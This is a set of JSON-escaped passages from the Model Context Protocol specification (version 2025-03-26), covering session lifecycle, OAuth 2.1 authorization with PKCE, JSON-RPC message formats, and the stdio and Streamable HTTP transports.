paths against provided roots\n\n## Implementation Guidelines\n\n1. Clients **SHOULD**:\n   - Prompt users for consent before exposing roots to servers\n   - Provide clear user interfaces for root management\n   - Validate root accessibility before exposing\n   - Monitor for root changes\n\n2. Servers **SHOULD**:\n   - Check for roots capability before usage\n   - Handle root list changes gracefully\n   - Respect root boundaries in operations\n   - Cache root information appropriately\n"}

This also permits backwards\ncompatibility with prior protocol versions that do not explicitly support JSON-RPC\nbatches.\n\nThe server **MUST** respond with its own capabilities and information:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"protocolVersion\": \"2025-03-26\",\n    \"capabilities\": {\n      \"logging\": {},\n      \"prompts\": {\n        \"listChanged\": true\n      },\n      \"resources\": {\n        \"subscribe\": true,\n        \"listChanged\": true\n      },\n      \"tools\": {\n        \"listChanged\": true\n      }\n    },\n    \"serverInfo\": {\n      \"name\": \"ExampleServer\",\n      \"version\": \"1.0.0\"\n    },\n    \"instructions\": \"Optional instructions for the client\"\n  }\n}\n```\n\nAfter successful initialization, the client **MUST** send an `initialized` notification\nto indicate it is ready to begin normal operations:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/initialized\"\n}\n```\n\n- The client **SHOULD NOT** send requests other than\n  [pings](/specification/2025-03-26/basic/utilities/ping) before the server has responded to the\n  `initialize` request.\n- The server **SHOULD NOT** send requests other than\n  [pings](/specification/2025-03-26/basic/utilities/ping) and\n  [logging](/specification/2025-03-26/server/utilities/logging) before receiving the `initialized`\n  notification.\n\n#### Version Negotiation\n\nIn the `initialize` request, the client **MUST** send a protocol version it supports.\nThis **SHOULD** be the _latest_ version supported by the client.\n\nIf the server supports the requested protocol version, it **MUST** respond with the same\nversion. Otherwise, the server **MUST** respond with another protocol version it\nsupports. This **SHOULD** be the _latest_ version supported by the server.\n\nIf the client does not support the version in the server's response, it **SHOULD**\ndisconnect.\n\n#### Capability Negotiation\n\nClient and server capabilities establish which optional protocol features will be\navailable during the session.\n\nKey capabilities include:\n\n| Category | Capability     | Description                                                                               |\n| -------- | -------------- | ----------------------------------------------------------------------------------------- |\n| Client   | `roots`        | Ability to provide filesystem [roots](/specification/2025-03-26/client/roots)             |\n| Client   | `sampling`     | Support for LLM [sampling](/specification/2025-03-26/client/sampling) requests            |\n| Client   | `experimental` | Describes support for non-standard experimental features                                  |\n| Server   | `prompts`      | Offers [prompt templates](/specification/2025-03-26/server/prompts)                       |\n| Server   | `resources`    | Provides readable [resources](/specification/2025-03-26/server/resources)                 |\n| Server   | `tools`        | Exposes callable [tools](/specification/2025-03-26/server/tools)                          |\n| Server   | `logging`      | Emits structured [log messages](/specification/2025-03-26/server/utilities/logging)       |\n| Server   | `completions`  | Supports argument [autocompletion](/specification/2025-03-26/server/utilities/completion) |\n| Server   | `experimental` | Describes support for non-standard experimental features                                  |\n\nCapability objects can describe sub-capabilities like:\n\n- `listChanged`: Support for list change notifications (for prompts, resources, and\n  tools)\n- `subscribe`: Support for subscribing to individual items' changes (resources only)\n\n### Operation\n\nDuring the operation phase, the client and server exchange messages according to the\nnegotiated capabilities.\n\nBoth parties **SHOULD**:\n\n- Respect the negotiated protocol version\n- Only use capabilities that were successfully negotiated\n\n### Shutdown\n\nDuring the shutdown phase, one side (usually the client) cleanly terminates the protocol\nconnection. No specific shutdown messages are defined—instead, the underlying transport\nmechanism should be used to signal connection termination:\n\n#### stdio\n\nFor the stdio [transport](/specification/2025-03-26/basic/transports), the client **SHOULD** initiate\nshutdown by:\n\n1. First, closing the input stream to the child process (the server)\n2. Waiting for the server to exit, or sending `SIGTERM` if the server does not exit\n   within a reasonable time\n3. Sending `SIGKILL` if the server does not exit within a reasonable time after `SIGTERM`\n\nThe server **MAY** initiate shutdown by closing its output stream to the client and\nexiting.\n\n#### HTTP\n\nFor HTTP [transports](/specification/2025-03-26/basic/transports), shutdown is indicated by closing the\nassociated HTTP connection(s).\n\n## Timeouts\n\nImplementations **SHOULD** establish timeouts for all sent requests, to prevent hung\nconnections and resource exhaustion. When the request has not received a success or error\nresponse within the timeout period, the sender **SHOULD** issue a [cancellation\nnotification](/specification/2025-03-26/basic/utilities/cancellation) for that request and stop waiting for\na response.\n\nSDKs and other middleware **SHOULD** allow these timeouts to be configured on a\nper-request basis.\n\nImplementations **MAY** choose to reset the timeout clock when receiving a [progress\nnotification](/specification/2025-03-26/basic/utilities/progress) corresponding to the request, as this\nimplies that work is actually happening. However, implementations **SHOULD** always\nenforce a maximum timeout, regardless of progress notifications, to limit the impact of a\nmisbehaving client or server.\n\n## Error Handling\n\nImplementations **SHOULD** be prepared to handle these error cases:\n\n- Protocol version mismatch\n- Failure to negotiate required capabilities\n- Request [timeouts](#timeouts)\n\nExample initialization error:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"error\": {\n    \"code\": -32602,\n    \"message\": \"Unsupported protocol version\",\n    \"data\": {\n      \"supported\": [\"2024-11-05\"],\n      \"requested\": \"1.0.0\"\n    }\n  }\n}\n```\n"}

This specification defines the authorization flow for HTTP-based transports.\n\n### Protocol Requirements\n\nAuthorization is **OPTIONAL** for MCP implementations. When supported:\n\n- Implementations using an HTTP-based transport **SHOULD** conform to this specification.\n- Implementations using an STDIO transport **SHOULD NOT** follow this specification, and\n  instead retrieve credentials from the environment.\n- Implementations using alternative transports **MUST** follow established security best\n  practices for their protocol.\n\n### Standards Compliance\n\nThis authorization mechanism is based on established specifications listed below, but\nimplements a selected subset of their features to ensure security and interoperability\nwhile maintaining simplicity:\n\n- [OAuth 2.1 IETF DRAFT](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-12)\n- OAuth 2.0 Authorization Server Metadata\n  ([RFC8414](https://datatracker.ietf.org/doc/html/rfc8414))\n- OAuth 2.0 Dynamic Client Registration Protocol\n  ([RFC7591](https://datatracker.ietf.org/doc/html/rfc7591))\n\n## Authorization Flow\n\n### Overview\n\n1. MCP auth implementations **MUST** implement OAuth 2.1 with appropriate security\n   measures for both confidential and public clients.\n\n2. MCP auth implementations **SHOULD** support the OAuth 2.0 Dynamic Client Registration\n   Protocol ([RFC7591](https://datatracker.ietf.org/doc/html/rfc7591)).\n\n3. MCP servers **SHOULD** and MCP clients **MUST** implement OAuth 2.0 Authorization\n   Server Metadata ([RFC8414](https://datatracker.ietf.org/doc/html/rfc8414)). Servers\n   that do not support Authorization Server Metadata **MUST** follow the default URI\n   schema.\n\n### OAuth Grant Types\n\nOAuth specifies different flows or grant types, which are different ways of obtaining an\naccess token. Each of these targets different use cases and scenarios.\n\nMCP servers **SHOULD** support the OAuth grant types that best align with the intended\naudience. For instance:\n\n1. Authorization Code: useful when the client is acting on behalf of a (human) end user.\n   - For instance, an agent calls an MCP tool implemented by a SaaS system.\n2. Client Credentials: the client is another application (not a human)\n   - For instance, an agent calls a secure MCP tool to check inventory at a specific\n     store. No need to impersonate the end user.\n\n### Example: authorization code grant\n\nThis demonstrates the OAuth 2.1 flow for the authorization code grant type, used for user\nauth.\n\n**NOTE**: The following example assumes the MCP server is also functioning as the\nauthorization server. However, the authorization server may be deployed as its own\ndistinct service.\n\nA human user completes the OAuth flow through a web browser, obtaining an access token\nthat identifies them personally and allows the client to act on their behalf.\n\nWhen authorization is required and not yet proven by the client, servers **MUST** respond\nwith _HTTP 401 Unauthorized_.\n\nClients initiate the\n[OAuth 2.1 IETF DRAFT](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-12#name-authorization-code-grant)\nauthorization flow after receiving the _HTTP 401 Unauthorized_.\n\nThe following demonstrates the basic OAuth 2.1 for public clients using PKCE.\n\n```mermaid\nsequenceDiagram\n    participant B as User-Agent (Browser)\n    participant C as Client\n    participant M as MCP Server\n\n    C->>M: MCP Request\n    M->>C: HTTP 401 Unauthorized\n    Note over C: Generate code_verifier and code_challenge\n    C->>B: Open browser with authorization URL + code_challenge\n    B->>M: GET /authorize\n    Note over M: User logs in and authorizes\n    M->>B: Redirect to callback URL with auth code\n    B->>C: Callback with authorization code\n    C->>M: Token Request with code + code_verifier\n    M->>C: Access Token (+ Refresh Token)\n    C->>M: MCP Request with Access Token\n    Note over C,M: Begin standard MCP message exchange\n```\n\n### Server Metadata Discovery\n\nFor server capability discovery:\n\n- MCP clients _MUST_ follow the OAuth 2.0 Authorization Server Metadata protocol defined\n  in [RFC8414](https://datatracker.ietf.org/doc/html/rfc8414).\n- MCP server _SHOULD_ follow the OAuth 2.0 Authorization Server Metadata protocol.\n- MCP servers that do not support the OAuth 2.0 Authorization Server Metadata protocol,\n  _MUST_ support fallback URLs.\n\nThe discovery flow is illustrated below:\n\n```mermaid\nsequenceDiagram\n    participant C as Client\n    participant S as Server\n\n    C->>S: GET /.well-known/oauth-authorization-server\n    alt Discovery Success\n        S->>C: 200 OK + Metadata Document\n        Note over C: Use endpoints from metadata\n    else Discovery Failed\n        S->>C: 404 Not Found\n        Note over C: Fall back to default endpoints\n    end\n    Note over C: Continue with authorization flow\n```\n\n#### Server Metadata Discovery Headers\n\nMCP clients _SHOULD_ include the header `MCP-Protocol-Version: <protocol-version>` during\nServer Metadata Discovery to allow the MCP server to respond based on the MCP protocol\nversion.\n\nFor example: `MCP-Protocol-Version: 2024-11-05`\n\n#### Authorization Base URL\n\nThe authorization base URL **MUST** be determined from the MCP server URL by discarding\nany existing `path` component. For example:\n\nIf the MCP server URL is `https://api.example.com/v1/mcp`, then:\n\n- The authorization base URL is `https://api.example.com`\n- The metadata endpoint **MUST** be at\n  `https://api.example.com/.well-known/oauth-authorization-server`\n\nThis ensures authorization endpoints are consistently located at the root level of the\ndomain hosting the MCP server, regardless of any path components in the MCP server URL.\n\n#### Fallbacks for Servers without Metadata Discovery\n\nFor servers that do not implement OAuth 2.0 Authorization Server Metadata, clients\n**MUST** use the following default endpoint paths relative to the [authorization base\nURL](#authorization-base-url):\n\n| Endpoint               | Default Path | Description                          |\n| ---------------------- | ------------ | ------------------------------------ |\n| Authorization Endpoint | /authorize   | Used for authorization requests      |\n| Token Endpoint         | /token       | Used for token exchange & refresh    |\n| Registration Endpoint  | /register    | Used for dynamic client registration |\n\nFor example, with an MCP server hosted at `https://api.example.com/v1/mcp`, the default\nendpoints would be:\n\n- `https://api.example.com/authorize`\n- `https://api.example.com/token`\n- `https://api.example.com/register`\n\nClients **MUST** first attempt to discover endpoints via the metadata document before\nfalling back to default paths. When using default paths, all other protocol requirements\nremain unchanged.\n\n### Dynamic Client Registration\n\nMCP clients and servers **SHOULD** support the\n[OAuth 2.0 Dynamic Client Registration Protocol](https://datatracker.ietf.org/doc/html/rfc7591)\nto allow MCP clients to obtain OAuth client IDs without user interaction. This provides a\nstandardized way for clients to automatically register with new servers, which is crucial\nfor MCP because:\n\n- Clients cannot know all possible servers in advance\n- Manual registration would create friction for users\n- It enables seamless connection to new servers\n- Servers can implement their own registration policies\n\nAny MCP servers that _do not_ support Dynamic Client Registration need to provide\nalternative ways to obtain a client ID (and, if applicable, client secret). For one of\nthese servers, MCP clients will have to either:\n\n1. Hardcode a client ID (and, if applicable, client secret) specifically for that MCP\n   server, or\n2. Present a UI to users that allows them to enter these details, after registering an\n   OAuth client themselves (e.g., through a configuration interface hosted by the\n   server).\n\n### Authorization Flow Steps\n\nThe complete Authorization flow proceeds as follows:\n\n```mermaid\nsequenceDiagram\n    participant B as User-Agent (Browser)\n    participant C as Client\n    participant M as MCP Server\n\n    C->>M: GET /.well-known/oauth-authorization-server\n    alt Server Supports Discovery\n        M->>C: Authorization Server Metadata\n    else No Discovery\n        M->>C: 404 (Use default endpoints)\n    end\n\n    alt Dynamic Client Registration\n        C->>M: POST /register\n        M->>C: Client Credentials\n    end\n\n    Note over C: Generate PKCE Parameters\n    C->>B: Open browser with authorization URL + code_challenge\n    B->>M: Authorization Request\n    Note over M: User /authorizes\n    M->>B: Redirect to callback with authorization code\n    B->>C: Authorization code callback\n    C->>M: Token Request + code_verifier\n    M->>C: Access Token (+ Refresh Token)\n    C->>M: API Requests with Access Token\n```\n\n#### Decision Flow Overview\n\n```mermaid\nflowchart TD\n    A[Start Auth Flow] --> B{Check Metadata Discovery}\n    B -->|Available| C[Use Metadata Endpoints]\n    B -->|Not Available| D[Use Default Endpoints]\n\n    C --> G{Check Registration Endpoint}\n    D --> G\n\n    G -->|Available| H[Perform Dynamic Registration]\n    G -->|Not Available| I[Alternative Registration Required]\n\n    H --> J[Start OAuth Flow]\n    I --> J\n\n    J --> K[Generate PKCE Parameters]\n    K --> L[Request Authorization]\n    L --> M[User Authorization]\n    M --> N[Exchange Code for Tokens]\n    N --> O[Use Access Token]\n```\n\n### Access Token Usage\n\n#### Token Requirements\n\nAccess token handling **MUST** conform to\n[OAuth 2.1 Section 5](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-12#section-5)\nrequirements for resource requests. Specifically:\n\n1. MCP client **MUST** use the Authorization request header field\n   [Section 5.1.1](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-12#section-5.1.1):\n\n```\nAuthorization: Bearer <access-token>\n```\n\nNote that authorization **MUST** be included in every HTTP request from client to server,\neven if they are part of the same logical session.\n\n2. Access tokens **MUST NOT** be included in the URI query string\n\nExample request:\n\n```http\nGET /v1/contexts HTTP/1.1\nHost: mcp.example.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIs...\n```\n\n#### Token Handling\n\nResource servers **MUST** validate access tokens as described in\n[Section 5.2](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-12#section-5.2).\nIf validation fails, servers **MUST** respond according to\n[Section 5.3](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-12#section-5.3)\nerror handling requirements. Invalid or expired tokens **MUST** receive a HTTP 401\nresponse.\n\n### Security Considerations\n\nThe following security requirements **MUST** be implemented:\n\n1. Clients **MUST** securely store tokens following OAuth 2.0 best practices\n2. Servers **SHOULD** enforce token expiration and rotation\n3. All authorization endpoints **MUST** be served over HTTPS\n4. Servers **MUST** validate redirect URIs to prevent open redirect vulnerabilities\n5. Redirect URIs **MUST** be either localhost URLs or HTTPS URLs\n\n### Error Handling\n\nServers **MUST** return appropriate HTTP status codes for authorization errors:\n\n| Status Code | Description  | Usage                                      |\n| ----------- | ------------ | ------------------------------------------ |\n| 401         | Unauthorized | Authorization required or token invalid    |\n| 403         | Forbidden    | Invalid scopes or insufficient permissions |\n| 400         | Bad Request  | Malformed authorization request            |\n\n### Implementation Requirements\n\n1. Implementations **MUST** follow OAuth 2.1 security best practices\n2. PKCE is **REQUIRED** for all clients\n3. Token rotation **SHOULD** be implemented for enhanced security\n4. Token lifetimes **SHOULD** be limited based on security requirements\n\n### Third-Party Authorization Flow\n\n#### Overview\n\nMCP servers **MAY** support delegated authorization through third-party authorization\nservers. In this flow, the MCP server acts as both an OAuth client (to the third-party\nauth server) and an OAuth authorization server (to the MCP client).\n\n#### Flow Description\n\nThe third-party authorization flow comprises these steps:\n\n1. MCP client initiates standard OAuth flow with MCP server\n2. MCP server redirects user to third-party authorization server\n3. User authorizes with third-party server\n4. Third-party server redirects back to MCP server with authorization code\n5. MCP server exchanges code for third-party access token\n6. MCP server generates its own access token bound to the third-party session\n7. MCP server completes original OAuth flow with MCP client\n\n```mermaid\nsequenceDiagram\n    participant B as User-Agent (Browser)\n    participant C as MCP Client\n    participant M as MCP Server\n    participant T as Third-Party Auth Server\n\n    C->>M: Initial OAuth Request\n    M->>B: Redirect to Third-Party /authorize\n    B->>T: Authorization Request\n    Note over T: User authorizes\n    T->>B: Redirect to MCP Server callback\n    B->>M: Authorization code\n    M->>T: Exchange code for token\n    T->>M: Third-party access token\n    Note over M: Generate bound MCP token\n    M->>B: Redirect to MCP Client callback\n    B->>C: MCP authorization code\n    C->>M: Exchange code for token\n    M->>C: MCP access token\n```\n\n#### Session Binding Requirements\n\nMCP servers implementing third-party authorization **MUST**:\n\n1. Maintain secure mapping between third-party tokens and issued MCP tokens\n2. Validate third-party token status before honoring MCP tokens\n3. Implement appropriate token lifecycle management\n4. Handle third-party token expiration and renewal\n\n#### Security Considerations\n\nWhen implementing third-party authorization, servers **MUST**:\n\n1. Validate all redirect URIs\n2. Securely store third-party credentials\n3. Implement appropriate session timeout handling\n4. Consider security implications of token chaining\n5. Implement proper error handling for third-party auth failures\n\n## Best Practices\n\n#### Local clients as Public OAuth 2.1 Clients\n\nWe strongly recommend that local clients implement OAuth 2.1 as a public client:\n\n1. Utilizing code challenges (PKCE) for authorization requests to prevent interception\n   attacks\n2. Implementing secure token storage appropriate for the local system\n3. Following token refresh best practices to maintain sessions\n4. Properly handling token expiration and renewal\n\n#### Authorization Metadata Discovery\n\nWe strongly recommend that all clients implement metadata discovery. This reduces the\nneed for users to provide endpoints manually or clients to fallback to the defined\ndefaults.\n\n#### Dynamic Client Registration\n\nSince clients do not know the set of MCP servers in advance, we strongly recommend the\nimplementation of dynamic client registration. This allows applications to automatically\nregister with the MCP server, and removes the need for users to obtain client ids\nmanually.\n"}

Other components **MAY** be implemented based on the specific needs of the\napplication.\n\nThese protocol layers establish clear separation of concerns while enabling rich\ninteractions between clients and servers. The modular design allows implementations to\nsupport exactly the features they need.\n\n## Messages\n\nAll messages between MCP clients and servers **MUST** follow the\n[JSON-RPC 2.0](https://www.jsonrpc.org/specification) specification. The protocol defines\nthese types of messages:\n\n### Requests\n\nRequests are sent from the client to the server or vice versa, to initiate an operation.\n\n```typescript\n{\n  jsonrpc: \"2.0\";\n  id: string | number;\n  method: string;\n  params?: {\n    [key: string]: unknown;\n  };\n}\n```\n\n- Requests **MUST** include a string or integer ID.\n- Unlike base JSON-RPC, the ID **MUST NOT** be `null`.\n- The request ID **MUST NOT** have been previously used by the requestor within the same\n  session.\n\n### Responses\n\nResponses are sent in reply to requests, containing the result or error of the operation.\n\n```typescript\n{\n  jsonrpc: \"2.0\";\n  id: string | number;\n  result?: {\n    [key: string]: unknown;\n  }\n  error?: {\n    code: number;\n    message: string;\n    data?: unknown;\n  }\n}\n```\n\n- Responses **MUST** include the same ID as the request they correspond to.\n- **Responses** are further sub-categorized as either **successful results** or\n  **errors**. Either a `result` or an `error` **MUST** be set. A response **MUST NOT**\n  set both.\n- Results **MAY** follow any JSON object structure, while errors **MUST** include an\n  error code and message at minimum.\n- Error codes **MUST** be integers.\n\n### Notifications\n\nNotifications are sent from the client to the server or vice versa, as a one-way message.\nThe receiver **MUST NOT** send a response.\n\n```typescript\n{\n  jsonrpc: \"2.0\";\n  method: string;\n  params?: {\n    [key: string]: unknown;\n  };\n}\n```\n\n- Notifications **MUST NOT** include an ID.\n\n### Batching\n\nJSON-RPC also defines a means to\n[batch multiple requests and notifications](https://www.jsonrpc.org/specification#batch),\nby sending them in an array.

JSON-RPC messages **MUST** be UTF-8 encoded.\n\nThe protocol currently defines two standard transport mechanisms for client-server\ncommunication:\n\n1. [stdio](#stdio), communication over standard in and standard out\n2. [Streamable HTTP](#streamable-http)\n\nClients **SHOULD** support stdio whenever possible.\n\nIt is also possible for clients and servers to implement\n[custom transports](#custom-transports) in a pluggable fashion.\n\n## stdio\n\nIn the **stdio** transport:\n\n- The client launches the MCP server as a subprocess.\n- The server reads JSON-RPC messages from its standard input (`stdin`) and sends messages\n  to its standard output (`stdout`).\n- Messages may be JSON-RPC requests, notifications, responses—or a JSON-RPC\n  [batch](https://www.jsonrpc.org/specification#batch) containing one or more requests\n  and/or notifications.\n- Messages are delimited by newlines, and **MUST NOT** contain embedded newlines.\n- The server **MAY** write UTF-8 strings to its standard error (`stderr`) for logging\n  purposes. Clients **MAY** capture, forward, or ignore this logging.\n- The server **MUST NOT** write anything to its `stdout` that is not a valid MCP message.\n- The client **MUST NOT** write anything to the server's `stdin` that is not a valid MCP\n  message.\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server Process\n\n    Client->>+Server Process: Launch subprocess\n    loop Message Exchange\n        Client->>Server Process: Write to stdin\n        Server Process->>Client: Write to stdout\n        Server Process--)Client: Optional logs on stderr\n    end\n    Client->>Server Process: Close stdin, terminate subprocess\n    deactivate Server Process\n```\n\n## Streamable HTTP\n\n<Info>\n\nThis replaces the [HTTP+SSE\ntransport](/specification/2024-11-05/basic/transports#http-with-sse) from\nprotocol version 2024-11-05. See the [backwards compatibility](#backwards-compatibility)\nguide below.\n\n</Info>\n\nIn the **Streamable HTTP** transport, the server operates as an independent process that\ncan handle multiple client connections. This transport uses HTTP POST and GET requests.\nServer can optionally make use of\n[Server-Sent Events](https://en.wikipedia.org/wiki/Server-sent_events) (SSE) to stream\nmultiple server messages. This permits basic MCP servers, as well as more feature-rich\nservers supporting streaming and server-to-client notifications and requests.\n\nThe server **MUST** provide a single HTTP endpoint path (hereafter referred to as the\n**MCP endpoint**) that supports both POST and GET methods. For example, this could be a\nURL like `https://example.com/mcp`.\n\n#### Security Warning\n\nWhen implementing Streamable HTTP transport:\n\n1. Servers **MUST** validate the `Origin` header on all incoming connections to prevent DNS rebinding attacks\n2. When running locally, servers **SHOULD** bind only to localhost (127.0.0.1) rather than all network interfaces (0.0.0.0)\n3. Servers **SHOULD** implement proper authentication for all connections\n\nWithout these protections, attackers could use DNS rebinding to interact with local MCP servers from remote websites.\n\n### Sending Messages to the Server\n\nEvery JSON-RPC message sent from the client **MUST** be a new HTTP POST request to the\nMCP endpoint.\n\n1. The client **MUST** use HTTP POST to send JSON-RPC messages to the MCP endpoint.\n2. The client **MUST** include an `Accept` header, listing both `application/json` and\n   `text/event-stream` as supported content types.\n3. The body of the POST request **MUST** be one of the following:\n   - A single JSON-RPC _request_, _notification_, or _response_\n   - An array [batching](https://www.jsonrpc.org/specification#batch) one or more\n     _requests and/or notifications_\n   - An array [batching](https://www.jsonrpc.org/specification#batch) one or more\n     _responses_\n4. If the input consists solely of (any number of) JSON-RPC _responses_ or\n   _notifications_:\n   - If the server accepts the input, the server **MUST** return HTTP status code 202\n     Accepted with no body.\n   - If the server cannot accept the input, it **MUST** return an HTTP error status code\n     (e.g., 400 Bad Request). The HTTP response body **MAY** comprise a JSON-RPC _error\n     response_ that has no `id`.\n5. If the input contains any number of JSON-RPC _requests_, the server **MUST** either\n   return `Content-Type: text/event-stream`, to initiate an SSE stream, or\n   `Content-Type: application/json`, to return one JSON object. The client **MUST**\n   support both these cases.\n6. If the server initiates an SSE stream:\n   - The SSE stream **SHOULD** eventually include one JSON-RPC _response_ per each\n     JSON-RPC _request_ sent in the POST body. These _responses_ **MAY** be\n     [batched](https://www.jsonrpc.org/specification#batch).\n   - The server **MAY** send JSON-RPC _requests_ and _notifications_ before sending a\n     JSON-RPC _response_. These messages **SHOULD** relate to the originating client\n     _request_. These _requests_ and _notifications_ **MAY** be\n     [batched](https://www.jsonrpc.org/specification#batch).\n   - The server **SHOULD NOT** close the SSE stream before sending a JSON-RPC _response_\n     per each received JSON-RPC _request_, unless the [session](#session-management)\n     expires.\n   - After all JSON-RPC _responses_ have been sent, the server **SHOULD** close the SSE\n     stream.\n   - Disconnection **MAY** occur at any time (e.g., due to network conditions).\n     Therefore:\n     - Disconnection **SHOULD NOT** be interpreted as the client cancelling its request.\n     - To cancel, the client **SHOULD** explicitly send an MCP `CancelledNotification`.\n     - To avoid message loss due to disconnection, the server **MAY** make the stream\n       [resumable](#resumability-and-redelivery).\n\n### Listening for Messages from the Server\n\n1. The client **MAY** issue an HTTP GET to the MCP endpoint. This can be used to open an\n   SSE stream, allowing the server to communicate to the client, without the client first\n   sending data via HTTP POST.\n2. The client **MUST** include an `Accept` header, listing `text/event-stream` as a\n   supported content type.\n3. The server **MUST** either return `Content-Type: text/event-stream` in response to\n   this HTTP GET, or else return HTTP 405 Method Not Allowed, indicating that the server\n   does not offer an SSE stream at this endpoint.\n4. If the server initiates an SSE stream:\n   - The server **MAY** send JSON-RPC _requests_ and _notifications_ on the stream. These\n     _requests_ and _notifications_ **MAY** be\n     [batched](https://www.jsonrpc.org/specification#batch).\n   - These messages **SHOULD** be unrelated to any concurrently-running JSON-RPC\n     _request_ from the client.\n   - The server **MUST NOT** send a JSON-RPC _response_ on the stream **unless**\n     [resuming](#resumability-and-redelivery) a stream associated with a previous client\n     request.\n   - The server **MAY** close the SSE stream at any time.\n   - The client **MAY** close the SSE stream at any time.\n\n### Multiple Connections\n\n1. The client **MAY** remain connected to multiple SSE streams simultaneously.\n2. The server **MUST** send each of its JSON-RPC messages on only one of the connected\n   streams; that is, it **MUST NOT** broadcast the same message across multiple streams.\n   - The risk of message loss **MAY** be mitigated by making the stream\n     [resumable](#resumability-and-redelivery).\n\n### Resumability and Redelivery\n\nTo support resuming broken connections, and redelivering messages that might otherwise be\nlost:\n\n1. Servers **MAY** attach an `id` field to their SSE events, as described in the\n   [SSE standard](https://html.spec.whatwg.org/multipage/server-sent-events.html#event-stream-interpretation).\n   - If present, the ID **MUST** be globally unique across all streams within that\n     [session](#session-management)—or all streams with that specific client, if session\n     management is not in use.\n2. If the client wishes to resume after a broken connection, it **SHOULD** issue an HTTP\n   GET to the MCP endpoint, and include the\n   [`Last-Event-ID`](https://html.spec.whatwg.org/multipage/server-sent-events.html#the-last-event-id-header)\n   header to indicate the last event ID it received.\n   - The server **MAY** use this header to replay messages that would have been sent\n     after the last event ID, _on the stream that was disconnected_, and to resume the\n     stream from that point.\n   - The server **MUST NOT** replay messages that would have been delivered on a\n     different stream.\n\nIn other words, these event IDs should be assigned by servers on a _per-stream_ basis, to\nact as a cursor within that particular stream.\n\n### Session Management\n\nAn MCP \"session\" consists of logically related interactions between a client and a\nserver, beginning with the [initialization phase](/specification/2025-03-26/basic/lifecycle). To support\nservers which want to establish stateful sessions:\n\n1. A server using the Streamable HTTP transport **MAY** assign a session ID at\n   initialization time, by including it in an `Mcp-Session-Id` header on the HTTP\n   response containing the `InitializeResult`.\n   - The session ID **SHOULD** be globally unique and cryptographically secure (e.g., a\n     securely generated UUID, a JWT, or a cryptographic hash).\n   - The session ID **MUST** only contain visible ASCII characters (ranging from 0x21 to\n     0x7E).\n2. If an `Mcp-Session-Id` is returned by the server during initialization, clients using\n   the Streamable HTTP transport **MUST** include it in the `Mcp-Session-Id` header on\n   all of their subsequent HTTP requests.\n   - Servers that require a session ID **SHOULD** respond to requests without an\n     `Mcp-Session-Id` header (other than initialization) with HTTP 400 Bad Request.\n3. The server **MAY** terminate the session at any time, after which it **MUST** respond\n   to requests containing that session ID with HTTP 404 Not Found.\n4. When a client receives HTTP 404 in response to a request containing an\n   `Mcp-Session-Id`, it **MUST** start a new session by sending a new `InitializeRequest`\n   without a session ID attached.\n5. Clients that no longer need a particular session (e.g., because the user is leaving\n   the client application) **SHOULD** send an HTTP DELETE to the MCP endpoint with the\n   `Mcp-Session-Id` header, to explicitly terminate the session.\n   - The server **MAY** respond to this request with HTTP 405 Method Not Allowed,\n     indicating that the server does not allow clients to terminate sessions.\n\n### Sequence Diagram\n\n```mermaid\nsequenceDiagram\n    participant Client\n    participant Server\n\n    note over Client, Server: initialization\n\n    Client->>+Server: POST InitializeRequest\n    Server->>-Client: InitializeResponse<br>Mcp-Session-Id: 1868a90c...\n\n    Client->>+Server: POST InitializedNotification<br>Mcp-Session-Id: 1868a90c...\n    Server->>-Client: 202 Accepted\n\n    note over Client, Server: client requests\n    Client->>+Server: POST ... request ...<br>Mcp-Session-Id: 1868a90c...\n\n    alt single HTTP response\n      Server->>Client: ... response ...\n    else server opens SSE stream\n      loop while connection remains open\n          Server-)Client: ...

SSE messages from server ...\n    end\n    deactivate Server\n\n```\n\n### Backwards Compatibility\n\nClients and servers can maintain backwards compatibility with the deprecated [HTTP+SSE\ntransport](/specification/2024-11-05/basic/transports#http-with-sse) (from\nprotocol version 2024-11-05) as follows:\n\n**Servers** wanting to support older clients should:\n\n- Continue to host both the SSE and POST endpoints of the old transport, alongside the\n  new \"MCP endpoint\" defined for the Streamable HTTP transport.\n  - It is also possible to combine the old POST endpoint and the new MCP endpoint, but\n    this may introduce unneeded complexity.\n\n**Clients** wanting to support older servers should:\n\n1. Accept an MCP server URL from the user, which may point to either a server using the\n   old transport or the new transport.\n2. Attempt to POST an `InitializeRequest` to the server URL, with an `Accept` header as\n   defined above:\n   - If it succeeds, the client can assume this is a server supporting the new Streamable\n     HTTP transport.\n   - If it fails with an HTTP 4xx status code (e.g., 405 Method Not Allowed or 404 Not\n     Found):\n     - Issue a GET request to the server URL, expecting that this will open an SSE stream\n       and return an `endpoint` event as the first event.\n     - When the `endpoint` event arrives, the client can assume this is a server running\n       the old HTTP+SSE transport, and should use that transport for all subsequent\n       communication.\n\n## Custom Transports\n\nClients and servers **MAY** implement additional custom transport mechanisms to suit\ntheir specific needs. The protocol is transport-agnostic and can be implemented over any\ncommunication channel that supports bidirectional message exchange.\n\nImplementers who choose to support custom transports **MUST** ensure they preserve the\nJSON-RPC message format and lifecycle requirements defined by MCP. Custom transports\n**SHOULD** document their specific connection establishment and message exchange patterns\nto aid interoperability.\n"}

